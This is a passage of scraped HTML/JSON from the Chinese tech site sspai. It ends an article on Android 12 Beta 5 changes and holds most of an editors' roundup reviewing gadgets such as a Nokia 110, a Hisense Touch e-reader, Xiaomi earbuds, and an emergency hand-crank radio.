class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4stck5b34td2engku50.png\"><figcaption>电源键菜单中的锁定按钮</figcaption></figure><p>但如果你像图中这样使用过问题反馈，加上默认新增的锁定按钮，电源键菜单就会显得有些拥挤了。</p>\n<p><a href=\"https://sspai.com/post/66737\" target=\"_blank\">Google I/O</a> 大会上预告过的 Private Compute Core 功能正式上线，位于系统设置的「隐私」选项中。它的作用设置说明也写得很清楚了，根据我们的联系人、应用和内容使用习惯，在设备上提供各种各样的实用建议；同时和此前 Google 在 I/O 大会上展示的一样，Private Compute Core 中所存储的信息仅保留在设备本地，并且可以随时在设置中手动清除。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stckdb34td201m60e0.png\"><figcaption>Private Compute Services 与 Private Compute Core 设置</figcaption></figure><p>系统应用中随之也新增了 Private Compute Services 服务，后续应该会跟随 Project Mainline 更新带来更多智能建议型的新功能。</p>\n<p>最后，如果你此前在 Android 系统中设置过「后台电量优化」，应该会明白这个页面有多难用：</p>\n<ul>\n<li>层级深：如果应用不提供跳转，就得自己在系统设置里找半天</li>\n<li>加载慢：以列表的形式呈现，每次进入都会遍历一遍系统中的所有应用</li>\n</ul>\n<p>但这个选项却很重要：<a href=\"https://sspai.com/app/Tasker\" target=\"_blank\">Tasker</a>、<a href=\"https://sspai.com/post/56954\" target=\"_blank\">Notify &amp; Fitness</a>……大部分需要后台常驻的应用都需要关闭后台电量优化。为此，Android 12 在最后一个测试版中对这一设置进行了重新整理：完全砍掉「后台电量优化」页面，同时将关闭后台电量优化设置整合为「应用信息 &gt; 电池」设置中的「无限制」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4stcklb34td2ab6qb0g.png\"><figcaption>无限制选项</figcaption></figure><p>当然，严格来说这项更新不算是 Android 12 Beta 5 的正式更新内容，因为在 Beta 5 之前就有部分 Beta 4.1 用户表示已经收到了相关更新。</p>\n<h2>正式版和 12.1 都在路上</h2>\n<p>以上便是 Android 12 Beta 5 值得关注的更新内容，不过既然候选发布版本已经来了，正式版究竟还有多久呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stcktb34td2ab6qb10.png\"><figcaption>Android 12 更新时间线</figcaption></figure><p>从 Google 给出的时间线虽然看不出任何确切的暗示，但就在最近，OPPO ColorOS 官方微博 <a href=\"https://weibo.com/3402761920/Kx2asqhse\" target=\"_blank\">表示</a> ColorOS 12 将在 9 月中下旬发布。这里补充两点背景信息：</p>\n<ul>\n<li>ColorOS 在 2020 年直接将版本号从原计划的 ColorOS 8 提到了 ColorOS 11，为的就是和 Android 大版本号保持同步</li>\n<li>ColorOS 此前也针对 Android 的开发者预览版和测试版推出过测试，但从未针对非正式版本召开大型发布会</li>\n</ul>\n<p>由此我们基本可以推断，Google 很有可能会在 9 月中下旬放出 Android 12 正式版，OPPO 则将同期发布 ColorOS 12 正式版。实际情况如何，咱们拭目以待吧。</p>\n<p>另一个 <a href=\"https://www.xda-developers.com/android-12-v2-update/\" target=\"_blank\">小彩蛋</a> 则是，眼尖的 XDA 在查阅 Google 源码的过程中发现了大量与 <code>sc-v2</code> 相关的代码以及并不会提升 API 等级的代码分支 <code>sc-v2-dev</code>。这里解释一下：</p>\n<ul>\n<li>虽然 Google 从 Android 10 开始取消了对外 <a href=\"https://sspai.com/post/56345\" target=\"_blank\">甜品代号</a> 的传统，但各版本 Android 在 Google 内部仍有代号，此前有 <a href=\"https://www.xda-developers.com/android-12-snow-cone-dessert/\" target=\"_blank\">传闻</a> 说，Android 12 的内部代号就是 snow cone，缩写正是上面提到的 <code>sc</code>\n</li>\n<li>虽然早年 Google 也有小版本更新对应单独的 API 等级的情况，自从 Android 进入一年一次大版本更新的节奏后，API 等级便与 Android 系统版本一一对应</li>\n</ul>\n<p>所以 XDA 推测这里的 <code>sc-v2</code> 暗示着 Google 接下来可能还会为 Android 12 推出小版本更新。不过这里我们也可以提供另一个角度供大家参考：</p>\n<blockquote><p>2016 年，Android 7.0 正式版推出不久之后，Google 拿出了出厂预装 Android 7.1 的第一代 Google Pixel 手机……</p></blockquote>\n<p>作为搭载 Tensor SoC 的首款 Pixel 机型，接下来的 <a href=\"https://sspai.com/post/68074\" target=\"_blank\">Pixel 6</a> 如果能够享受类似的待遇首发搭载 Android 12.1，似乎也说得过去。欢迎大家在评论区留言分享你的看法。</p>\n<p><strong>参考来源：</strong></p>\n<ul>\n<li><a href=\"https://android-developers.googleblog.com/2021/08/android12beta5.html\" target=\"_blank\">Android Developers Blog: Android 12 Beta 5 update, official release is next! (googleblog.com)</a></li>\n<li><a href=\"https://www.xda-developers.com/android-12-beta-5-changelog/\" target=\"_blank\">Android 12 Beta 5 update: Here's everything that's new! (xda-developers.com)</a></li>\n<li><a href=\"https://9to5google.com/2021/09/08/android-12-beta-5-new-features/\" target=\"_blank\">Here's everything new in Android 12 Beta 5 [Gallery] - 9to5Google</a></li>\n</ul>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/68267\" target=\"_blank\">具透 | 正式版进入倒计时：Android 12 Beta 4 更新细节速览</a></li>\n<li><a href=\"https://sspai.com/post/68074\" target=\"_blank\">Google Pixel 6 系列提前官宣：6 个细节、6 种配色，还有很 6 的配置</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68676"},{"title":"新玩意 077｜少数派的编辑们最近买了啥？","date":"2021-09-09 09:20:21","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@张奕源 Nick：诺基亚 110</h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>参考价格：249 元</li>\n</ul>\n<p>作为多卡一族，我有好几个历史遗留的 sim 卡用来接收短信。但在我一番电子设备大清理以后，手头已经没有合适的手机存放这些 sim 卡。刚好诺基亚推出了这款新品，我就买回来当个备机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskttb34td201m6070.jpeg\"></figure><p>看上 110 的主要原因是它的外形别致，黄色也蛮好看。在 110 之前，诺基亚已经推出了无数类似定位和功能的备用机，价格和外形大同小异。110 的键盘造型与侧面弧线让整机有了那么点「跑车味儿」，加上这个独特的黄色，足够在众多功能机里脱颖而出。</p>\n<p>诺基亚 110 的背盖采用了一种奇妙的网格工艺，我不太喜欢。网格摸起来手感很粗糙，而且还会带来不耐脏、易刮花等问题。不过鉴于它是个两百块的备用机，我对其做工自然没有太多苛责。但这个网纹明明可以不做，该设计也彰显了诺记吃力不讨好的冤大头作风。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssku5b34td201m607g.jpeg\"></figure><p>和其它功能机相比，110 的特色是支援支付宝和喜马拉雅。其支付宝的使用方式和智能手环类似，需要支付宝主账号在别的手机上以扫码的方式绑定 110，之后就能在 110 上调出支付码了。这种支付方式也决定了它只可能作为年轻人的备用机——如果给家里的长辈使用，还需要另外一部登录了支付宝主账号的智能机，等于多此一举。</p>\n<p>另一个决定了其备用机地位的配置就是这款手机的萤幕。其萤幕尺寸仅有 1.8 英寸，分辨率为 QQVGA，就算设置为大字体，对老年人来说也不友好。不过，这款功能机有多语言支援，特别是能显示传统汉字，这对于我用来收验证码的香港卡来说很是实用。显示传统字这件事看似不大，但只要收到过两次全是小方块的短信，就能体会其中的蛋疼。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskudb34td2ab6qam0.jpeg\"></figure><p>另外，这款手机还有一个摄像头，可以拍摄照片。成像质量相当梦幻，很难想象曾经的我们用这样的摄像头是怎么记录美好生活的。在 2021 年的今天，用这样一个摄像头拍照，倒是独有一番乐趣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskulb34td2ab6qamg.jpeg\"></figure><p>总体来说，诺基亚 110 是个挺不错的备用机，支援双卡双 4G 待机，各种手电筒、通话录音、单位换算器之类的小功能做得很完善，加上祖传的超长待机能力，收短信、打电话之类相当足够。如果有闲情逸致还能听听 FM 广播，玩一把贪吃蛇，在智能机时代回味一下曾经的玩机乐趣。</p>\n<h2>@Microhoo：bgest 真空保鲜罐</h2>\n<ul>\n<li>入手渠道：<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/1y8w2b7e9ywao\" target=\"_blank\">少数派商店</a>\n</li>\n<li>价格：800ml×2 ￥199 <s>原价￥239</s> / 1100ml×2 ￥229 <s>原价￥259</s> / 4 件套￥379 <s>原价￥399</s>\n</li>\n</ul>\n<p>我在 <a href=\"https://sspai.com/post/65742\" target=\"_blank\">之前的文章里</a> 分享了一些导致食物变质的原因以及我在用的一些食品收纳容器，文中其实缺少一种我想很多人都非常熟悉的「真空储存」方案，当然不是因为这种方法不好，而是太麻烦。我其实有一台 BOSCH 的真空破壁机，我还另买了它配套的真空食品盒，也就是可以通过空气管链接两者将食品盒内抽成真空储存食物，可以大大延长食物的赏味期——非常好用，但是我想即便是看这短短的两句话你应该都会觉得非常麻烦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskutb34td2engktq0.jpeg\"><figcaption>bgest 真空保鲜罐</figcaption></figure><p>好在无所不有的问路在知道我有用相关产品时，欣然寄了一套 bgest 真空保鲜罐给我，彻底刷新了我对真空储物罐的使用体验。从外表上来看，bgest 真空保鲜罐和普通的食品罐别无二致，就是盖子好像有点巨大，这是因为它的真空功能全部隐藏在了盖子里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskv5b34td27uspv8g.jpeg\"><figcaption>从上往下依次是释压键、电源键和磁吸充电口</figcaption></figure><p>相比市面上的大部分真空储物产品，bgest 真空保鲜罐既不用费劲的手动抽气，也不用翻箱倒柜的找空气管连接电动气泵抽气，取出食物时轻轻上掰一下正中心的释压口就可以轻松开盖，拿出之后盖会盖子按一下电源键便会开始抽出罐内空气并自动停止；而电源键下方的两个磁吸充电接口充满电后可以正常使用半年（官方的测试数据，当然具体续航取决于使用习惯）。我很想多讲一点什么，但是bgest 真空保鲜罐使用就是这么简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskvlb34td2engktqg.jpeg\"><figcaption>瓶身是非常厚实的高硼硅玻璃</figcaption></figure><p>用料上盖儿部分使用的是 ABS 和食品级硅胶，而直接和食物接触的则是绝对安全无害的高硼硅玻璃，原则上你可以无忧存放液体或固体的任何事物。相比普通玻璃材质，高硼硅具有更好的耐热性，而且因为厚度可人，你甚至可以把它当作饭盒使用并能直接用于微波炉加热，瞬间就拥有了更多的使用场景。</p>\n<p>bgest 真空保鲜罐是一个很简单但极其实用的产品，但也是一个很难用太多文字去描述的产品，因为食品罐不稀奇，真空储存也不是啥了不起的黑科技——但看似简单的将两者结合在一起省时省力的设计，是我们生活向往舒适的巨大一步。</p>\n<h2>@老麦：小特车载充电器套装</h2>\n<ul>\n<li>入手：淘宝小特未来商店</li>\n<li>价格：268 元整套</li>\n</ul>\n<p>之前由于特斯拉车机导航的本土化做的不好，所以手机支架已经成了必备配件，但特斯拉的隐藏式空调口，让大部分支架都没法兼容。看了一圈各种定制产品，我还是觉得小特叔叔家的 OBD 车载支架最为完美，但因为安装上有一点门槛，所以很多用户都不太知道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskvtb34td2engktr0.jpeg\"></figure><p>支架的位置设计很有学问，特斯拉本来就是极简中控，如果中间搞个复杂支架放那，实在是违和，而老马苦心设计的开阔视野，视线也会被手机遮挡。小特的支架选择贴合在左侧的空调口边缘，手机刚好放在 A 柱范围内，没有遮挡任何视野，高度也刚刚好，看导航不需要刻意的抬头和低头。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl05b34td2engktrg.jpeg\"></figure><p>为了让支架更隐形，根据空调口位置进行了专门的开模，底座就完美贴合在中控上，同时不遮挡空调出风，又能保证一定的散热效果。而走线则完全隐藏在侧面的内饰版里面，只有俯身到方向盘下面才会看到 OBD 接口，整体设计非常完美。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/12dd14235ab133776b3c7ead56ce86e8.png\"></figure><p>同时，因为支架球头部分是通用的，所以你可以后期自己换各种充电器，可以是 MagSafe 磁吸，也可以买小米华为那种自动托盘的，还可以选下图这种 PITAKA 专用的磁吸壳和配套车载充电器，因为两边都有加强磁力，要去路况颠簸的地方，会更加安全稳妥。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/a01f196b9077c24e8863b3b8226a4f80.png\"></figure><p>其实经过几个版本更新之后，特斯拉车机地图已经好用很多了，但确实也没法跟更熟悉本地情况的百度和高德相比，所以手机辅助还是有必要的。目前为止，小特这个套装产品还是一步到位的最佳选择。</p>\n<h2>@PlatyHsu：海信 Touch</h2>\n<p>iPod touch 是我最喜欢的电子产品之一。它寄居在手机的外壳中，让人用相对较低的成本体验到不输「完全体」的功能；虽然刨去了通讯模块，但对于已经不再需要另一台手机的用户而言，反倒也算一种优点而非缺陷。</p>\n<p>在 iPod touch 久未更新、行将就木之际，我又迎来了另一台名为「touch」的产品——海信 Touch。这是海信在推出数代墨水屏（E-Ink）手机后，发布的一款不带通讯功能的纯阅读器产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl1lb34td2ab6qan0.jpeg\"></figure><p>每台墨水屏产品都不可避免地要面对「买来干什么」的灵魂拷问。对此，海信 Touch 的答案大概会是<strong>「打不过就加入」</strong>：既然动不动就刷手机的习惯难以克服，那至少让自己的眼睛得到保护。要做到这点，替代品的尺寸、功能越接近正常手机，「欺骗」效果就越好。因此，海信 Touch 这种四舍五入就是个手机的阅读器，就成了当仁不让的选择。</p>\n<p>当然，市面上已经有了不少小尺寸墨水屏 Android 设备，除了海信自家的 A 系列手机，还有来自掌阅、口袋阅、墨案的可选。与它们相比，必须指出海信 Touch 的墨水屏素质只是中游水平：屏幕尺寸为 5.84 寸、分辨率为 1440 × 720 像素，像素密度为 276 ppi，比市面上其他墨水屏设备主流的约 300 ppi 左右略低。实际使用中，这项参数的劣势是可感知的；好在单色文字阅读的使用场景使然，对使用体验的影响不大。</p>\n<p>但除此之外，海信 Touch 的硬件其实亮点颇多：</p>\n<ul>\n<li>设计上：深绿色外壳（官方称为「黛青」，亦有「羽灰」）可选）配以亮橙色腰线点缀，且使用电纸书中少见的铝制机身，在质感上与中高端手机看齐。同时，7 毫米厚度、155 克重量、窄边框这些轻薄特质，也确保了优秀的手感。</li>\n<li>基础参数上：海信 Touch 使用高通骁龙 460 处理器（11 nm 制程、大小核设计）、4GB RAM，属于按手机标准惨不忍睹、按电子书标准鹤立鸡群的水平；128GB 的存储空间也足够慷慨。</li>\n</ul>\n<p>此外，继承同品牌墨水屏产品的家学渊源，海信 Touch 也内置了素质高于常规设计的解码、运放芯片和扬声器。但我并非专业发烧友，日常听歌场景也出于偷懒心理、越发以使用无线耳机为主，这个卖点对我的吸引力和实际意义有限。只能从主观角度作证耳塞（AKG N5005）直推的表现明显好于 iPhone 加官方转接线。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl2db34td201m6090.jpeg\"></figure><p>软件上看，海信 Touch 使用了比较新的 Android 11 作为底层系统。但是，墨水屏设备并不只是装上 Android 系统就能点石成金；定制化功能和针对性优化的重要性不可忽视。从这个角度看，海信系统给我留下了不错的第一印象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl2tb34td27uspv90.jpeg\"></figure><p>系统界面：启动器（第三方 Niagara）、通知中心、设置</p>\n<p>通过目前一段时间的使用，我主要发现的亮点包括：</p>\n<ul>\n<li>屏幕刷新率设置灵活：与我此前熟悉的文石系统类似，海信也提供清晰、均衡、平滑和极速多个屏显模式可选，其刷新率由慢而快，但残影现象相应由弱渐强。此外，海信系统的两个优秀细节在于，不仅可以在打开 app 后单独设置刷新率，还提供了专门的管理界面和批量设置的选项；同时，即使选择慢速刷新（显示质量优先），也可以在检测到滚屏操作时自动切换到高一档的刷新率，减少「幻灯片」效果。</li>\n<li>手势操作便捷：支持基本的全面屏手势——底部左中右边缘上划，分别对应返回、主页和多任务切换；也内置了悬浮球功能作为另一种导航方式。</li>\n<li>提供可定制功能的侧键：海信 Touch 机身左侧有一颗额外物理按键，系统设置中可以将该按键的单击、双击操作分别绑定到快捷方式、启动 app 等操作；对于阅读场景特别实用的包括模拟翻页、手动刷新屏幕和跳转到词典应用等。长按操作则固定为「闪念胶囊」功能，我发现特别适合用来做摘录：复制一段重点后，长按侧键唤出笔记，粘贴后按返回即可继续阅读。</li>\n</ul>\n<p>此外，由于海信 Touch 的系统与其手机产品大致相同，国产手机中常见的权限管理、后台冻结、空间清理、字体更换、锁屏布局等辅助或个性化功能也一应俱全。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl35b34td2ab6qang.jpeg\"></figure><p>特色功能：闪念胶囊、悬浮球、锁屏时钟</p>\n<p>但与此同时，海信系统的缺点也非常明显：</p>\n<ul>\n<li>不支持 Google 框架：与文石系统默认禁用 Google 框架、但可以手动开启不同，海信系统完全去除了 Google 框架，且客服在官方论坛中明确表示不会提供开启方式。因此，海信 Touch 上安装 app 只能自食其力。（固然有自带的应用市场，但打开只坚持了五秒就被广告吓跑了。）好在我在这台设备上用到的 app 以开源或免费的为主，大多可以通过 F-Droid、APKPure 等第三方应用商店解决。</li>\n<li>充斥大量广告：除了上面提到的应用市场，阅读、浏览器、天气这些内置应用中也充满了「牛皮癣」。虽然平心而论，海信系统中的广告密度与其他国产厂商相比已经算是收敛，且大多数可以关闭；但考虑到「阅读器」的产品定位，我仍然认为这么做是不够光彩的。</li>\n</ul>\n<p>（还有一个不算缺点的缺点：海信系统的英文界面实在是太魔性了。我第一次探索设置界面花了快一个小时，因为每点开一屏都想打滚笑一分钟。）</p>\n<p>附上我目前在海信 Touch 上的应用选择供参考：</p>\n<ul>\n<li>阅读器：KOReader。Linux/Android 设备阅读器的无冕之王。</li>\n<li>浏览器：Iceraven。这是一个基于 Firefox 但去除遥测功能、恢复插件安装能力的 fork 版。一些有助于墨水屏网页阅读体验的插件包括：</li>\n</ul>\n<ol>\n<li>uBlock Origin：广告屏蔽插件。</li>\n<li>Stylus：自定义 CSS。</li>\n<li>Dark Reader：本职功能为开启黑暗模式，但由于支持调整对比度，在墨水屏设备上可以活用为网页「漂白」插件。</li>\n</ol>\n<ul>\n<li>启动器：Niagara。简洁轻量，文字为主的布局也特别适合墨水屏。</li>\n<li>稍后读：Instapaper。同类产品 Pocket 亦运行良好。</li>\n<li>RSS：NewsBlur。Inoreader、Feedly 等常见服务客户端亦运行良好。</li>\n<li>文件管理：Solid Explorer。除了基础文件管理外，还提供了连接第三方云存储（方便访问 OneDrive 和 Dropbox 中的资源）、FTP 服务器（便于免数据线传输）等实用功能。</li>\n</ul>\n<p>最后简单说说选购建议：原价为 1600 元，个人认为存在品牌或概念等因素造成的溢价，根据此类产品销售规律，后期应有降价空间。如果需要近期入手，不妨多蹲一蹲那家知名海鲜市场——要相信吃完泡面的人总比想吃泡面的人多。</p>\n<h2>@aiokr：小米 FlipBuds Pro 降噪耳机</h2>\n<ul>\n<li>购入渠道：小米京东自营旗舰店</li>\n<li>购入价格：789 元</li>\n</ul>\n<p>首先吐槽一下，这个耳机的英文名称每次念出来都感觉在喷口水^_☆</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/c6a75882c5510d36dbce0ec5f95304e4.jpg\"><figcaption>耳机盒本体</figcaption></figure><p>自从在 BOSE 的体验店里第一次体验到降噪耳机的神奇之处后，就有种「回不去了」的感觉。加上这两个学期课程变少，在宿舍和工作室里看书写作业的时间变多了，对降噪耳机的需求就愈发增大。看了一大圈测评之后，最后就在 AirPods Pro 和小米 FlipBuds Pro 之 间纠结。</p>\n<p>不过一个 AirPods Pro 可以买两个小米的 FlipBuds Pro 了，而且看测评它们两之间的降噪水平差不多，我也数次前往小米之家体验这款耳机，没有出现网上评论经常说的「戴不稳」、「容易掉」的问题，于是就下单购买了小米 FlipBuds Pro。</p>\n<p>降噪能力上，入耳式的降噪耳机还是不比耳罩，不过敲键盘的声音、饮水机、风扇和空调运转的声音能够几乎消掉，说话的声音也能消掉大部分，在家里关上门窗之后也听不到楼下广场舞的低音炮，我对它的降噪能力就已经非常满足了。</p>\n<p>延迟上，没有实际地测试过，不过放视频是不会有太影响体验的延迟的，打游戏的话，音游不太合适，原神没什么大问题。</p>\n<p>外观上，形似鹅卵石的外壳和小米的新 LOGO 有异曲同工之妙，反正拿在手里感觉挺不错的。光面的外壳很容易沾染指纹，磨损之后也不好看，所以我就给他配了一个硅胶套==。</p>\n<p>软件方面，如果有升级到最近几个版本 MIUI 的小米/红米手机，在首次配对及后续使用中，可以直接通过弹窗显示耳机电量，与小米之前的耳机不同的是，FlipBuds Pro 可以直接在系统设置的蓝牙里对耳机进行设置，而不必使用小爱同学 App。但如果是其他的 Android 手机，还是需要下载小爱同学 App 来进行设置，iOS 的小爱同学则不支持设置这款耳机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/19e21ce90a64ee834c58842ee78f999b.jpg\"><figcaption>MIUI 系统中的弹窗</figcaption></figure><p>最后吐槽一下不太方便的地方，两个耳机在耳机盒里是「背对背」放置的，每次拿出耳机都要在手上转一下才能带到耳朵里。然后可能受充电和体积限制，无线充电的线圈比较小，放在充电板上需要仔细地放在中间才能充电。其次，目前为止小米还没有给这款耳机推送抗风噪的功能，带着跑步骑车就不能打开降噪了。最后，降噪模式下的耳压感比较强，如果平时容易晕车或者 3D 眩晕的话，坐公交这种比较摇晃的场景下开降噪，可能会有些头晕。</p>\n<h2>@Luckyle：Combat 2000「长舌包」 </h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>参考价格：121 元</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/49bb269c0b1c5ea2f8bd8d3574f012e5.JPG\"><figcaption>小巧玲珑，一手掌握</figcaption></figure><p>前阵子经过台风袭击后，觉得有必要配置下个人医疗包（Individual First Aid Kit）或者叫单兵急救包，以备不时之需。考虑以下几点：</p>\n<ul>\n<li>体积要 4L 以下（方便携带）</li>\n<li>Molle 系统（装具模块化系统）</li>\n<li>外壳防水</li>\n<li>多夹层设计</li>\n<li>最好有磁铁快拆设计（看起来酷一点）</li>\n</ul>\n<p>最重要是颜值能打，要有趣！</p>\n<p>我几乎看遍了国内外所有品牌，从传统战术厂商塔虎、5.11 看到国内新潮品牌狐蝠工业再到户外品牌神秘农场，千挑万选，或多或少有种种不足。后来看到这款国产 <strong>Combat 2000 的「长舌包」</strong>，第一眼觉得挺有趣，拉开拉链就像吐出的长舌头。这款包似乎是有原型，虽然我没有找到原版，但肯定有复刻的成分。价格很便宜，一百块出头，颜色很多，有灰色、黑色、狼棕色、游骑兵绿、multicam（多地形迷彩）。选择犹豫症犯了，最后选择不会出错的黑色，毕竟年轻人要低调点（狗头）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2474c49ce8dbf3f33ba9f2913009ad51.JPG\"></figure><p>这个包的精髓就是在闭合状态下，只需要扯下 D 型拉环就可以快速打开，包体里面的物件一览无余，快速取物，符合急救包的使用场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/16354ecd2fe60da2b5996c1d64766df7.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/641fe1a84fdaa9ffe340b0b98a66a783.JPG\"></figure><p>包身采用杜邦考杜拉面料，医疗包标配；特氟龙防泼水；顶部魔术贴面可以粘上喜欢的士气章，增添玩趣。可以搭配肩带斜挎携带。背部 Molle 系统可以挂在主包上，不怕少带一个包。</p>\n<p>总体来说是个性价比非常不错的小包，虽然没有磁铁快拆（也只有在狐蝠工业看到过），不会过于硬核，有 urban outdoor 风格。入门之选，买一个来把玩，关键时候还能派上大用场。</p>\n<h2>@刀客特Leslie：多功能防灾手摇发电手电筒收音机 </h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>价格：141.15（叠加多种优惠后）</li>\n</ul>\n<p>在郑州暴雨消息牵动全网的心的第二天，看着台风烟花的汹汹来势，我立刻就下单买了这个国家应急物资储备推荐的多功能手电筒收音机（以及救生衣、保温毯……）。</p>\n<p>选购时需满足的核心需求是：</p>\n<ul>\n<li>能作为手电提供照明，可以很好地接收收音机信号。</li>\n<li>支持多种形式充电，USB 线充电、太阳能充电和手摇发电，最好支持干电池供电。</li>\n<li>能给手机充电。</li>\n</ul>\n<p>至于其他的功能例如 SOS 警报、支持耳机、开瓶器什么的倒是添头了。外观我选择了最朴实无华的黑色款，到手的尺寸有点像爱遛弯儿的老头手腕上挂着的那种嗓门特别大的收音机。</p>\n<p>正面的按钮是收音机开关、调节音量和频道的案件，LCD 屏幕显示波段和电量，可以选择背光是否打开。不知道为啥右边背部的天线让我感到一股蠢萌感，在不把天线拉开的条件下，室内也可以较好地收到电台信号，好久没用过收音机再听到久违的雪花声有一种回忆的复古感，脑中开始播放各种末日电影的场景。搜寻电台只能使用上下键，但长按可以快速定位到有信号的相邻电台波段，也算方便。支持的波段是 FM 87-108MHZ 及 AM 520-1710KHZ，满电状态可用 20 小时的收音机。</p>\n<p>正面左下角还有一个 SOS 警报键，长按 3 秒后会发出 70 分贝以上的警报，并且手电筒开始频闪，短按后可关闭，这个功能比较适合在救援人员接近时起到呼救、指示方位的作用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/672fc4e6fc4c066cdfe298e0e033354d.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/195e628b64b88f5f1b19c56b58819050.jpeg\" alt=\"\"></figure><p>机器顶上有太阳能充电板，参数是 5.5V，30mA，这个我尚未拿到 8 月正午的阳光下试过。右侧是 USB 输出、一个 microUSB  的输入端（没有 typeC，看来逃命时还得备齐电源线🙃）和一个 3.5mm 耳机孔。商品介绍说锂电池的容量是 2000mA，USB 线充电需 3 小时充满。下面是个开瓶器，<s>想一想在末日逃生的途中开一瓶玻璃瓶装的可乐应该很爽吧，</s>还有一个登山扣，方便把这个不小的家伙挂在逃生背包上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/823d8f5a5152caa566ca931ddcee44ac.jpeg\"><figcaption>为了这开瓶器我可得装一个玻璃瓶装可乐到我的逃生背包中呢🙃</figcaption></figure><p>左侧是手电筒，LED 灯珠，亮度为 70 流明，据介绍寿命可达 1 万小时，上方是开关，不过只有一个档位，摁一下打开，再按关闭。电量充足时可连续照明 8 小时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/ae2ee04c3ad869e5602b35565f0130ef.jpeg\"></figure><p>背后有个手摇柄，据说手摇 1 分钟可以照明 30 分钟，实测了一下手摇不太快而且没一会儿手就会累了，我还是选择多备几节干电池好了🙃，需要装 3 节 7 号电池在下方的电池槽中。</p>\n<p>在没有任何危机的现实城市生活中，这个新玩意儿就像个怀旧的玩具一样。但气候变化带来了越来越频繁且难以预测的极端恶劣天气，我们有时候真的不知道明天和意外哪个会先来。郑州地铁 5 号线遇难者的家属肯定也没想到，不过是一个平凡的工作日，怎么就成了天人相隔的一天。我会好好地把这个收音机连同好多节干电池、压缩饼干、午餐肉、保温毯、求生哨一起塞进一个大大的双肩包里，然后祈求我有足够的幸运余生都不用把它们拿出来。也希望你和我一样，不忘记潜在的意外和危险，有备，才无患。</p>\n<h2>@青苗法鸣：Withings Body+ 体重秤</h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>参考价格：369 元（二手样机）</li>\n</ul>\n<p>工作后体重飙升，便准备入手一台体重秤<s>控制一下体重</s>。本科入学时添置的云麦体重秤随着我体重的增加，广告也日益增多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/07/d009bc650fa6d46206c7665c59d4d9c0.jpg\"><figcaption>开屏广告 | 发现页 | 商城页</figcaption></figure><p>由于我仅仅是想要长期观察一下体重趋势，并没有观看广告的需求。遂果断决定重新购买一台体重秤，要求只有一点，App 内没有任何广告即可。</p>\n<p>询问了十余家体重秤的网店客服，最后发现能做到 App 内无广告的厂家可能只有三位：欧姆龙、Garmin 和 Withings。虽然有在用 Garmin 的手环，但它的体重秤售价实在太高，下不去手。与欧姆龙相比，Withings 的 App 更美观，且这款体重秤上还有 Nokia 的标识，就决定买它了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"Withings Health 